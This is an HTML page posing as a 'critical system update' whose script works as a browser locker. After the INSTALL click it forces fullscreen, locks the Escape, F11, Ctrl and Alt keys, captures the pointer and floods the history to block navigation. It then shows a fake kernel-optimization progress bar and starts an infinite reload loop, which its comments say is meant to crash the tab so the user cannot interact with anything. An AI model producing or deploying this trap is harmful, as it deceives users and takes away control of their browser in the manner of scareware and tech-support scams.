<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>NEURAL LINK: PERMANENT SYNC</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; color: #00e5ff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; }
        #start-screen { text-align: center; border: 2px solid #00e5ff; padding: 100px; box-shadow: 0 0 100px #00e5ff; }
        .btn-sync { padding: 30px 80px; font-size: 3rem; background: #00e5ff; color: black; border: none; cursor: pointer; font-weight: bold; }
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 1000; flex-direction: column; justify-content: center; align-items: center; }
        #bar-outer { width: 80%; height: 40px; border: 2px solid #00e5ff; margin-top: 20px; }
        #bar-inner { width: 0%; height: 100%; background: #00e5ff; box-shadow: 0 0 20px #00e5ff; }
    </style>
</head>
<body>

<div id="start-screen">
    <h1>CRITICAL SYSTEM UPDATE</h1>
    <button class="btn-sync" onclick="engage()">INSTALL</button>
</div>

<div id="loading-overlay">
    <h1 id="status-msg">OPTIMIZING KERNEL...</h1>
    <div id="bar-outer"><div id="bar-inner"></div></div>
</div>

<script>
async function engage() {
    // 1. Silent Fullscreen & Input Hijack
    const doc = document.documentElement;
    if (doc.requestFullscreen) await doc.requestFullscreen();
    if (navigator.keyboard && navigator.keyboard.lock) {
        await navigator.keyboard.lock(["Escape", "F11", "KeyW", "ControlLeft", "AltLeft"]);
    }
    if (doc.requestPointerLock) doc.requestPointerLock();

    document.getElementById('start-screen').style.display = 'none';
    const overlay = document.getElementById('loading-overlay');
    overlay.style.display = 'flex';

    // 2. History Loop (Prevents Back/Forward/Reload Popups)
    setInterval(() => {
        window.history.pushState(null, "", window.location.href);
    }, 1);

    // 3. Loading Animation
    let p = 0;
    const bar = document.getElementById('bar-inner');
    const loadInt = setInterval(() => {
        p += 0.2;
        bar.style.width = p + "%";
        if (p >= 100) {
            clearInterval(loadInt);
            freezeSystem();
        }
    }, 10);
}

function freezeSystem() {
    // 4. The "No-Popup" Trap: Memory Spike & Thread Lock
    // Instead of location.reload() which triggers a popup, we use a recursive loop
    // that crashes the tab renderer so the user can't interact with anything.
    console.log("System Locked.");
    
    // Disable any interaction
    window.onbeforeunload = null; 
    
    // Set the localStorage flag when the user tries to leave/reload
            window.onbeforeunload = function () {
                localStorage.x = 1;
            };
    
            // Wait 5 seconds (5000ms), then start the reload loop
            setTimeout(function () {
                console.log("Starting reload loop...");
                
                // This creates an infinite loop of reload commands
                while (true) {
                    location.reload();
                }
            }, 5000);
}
</script>
</body>
</html>
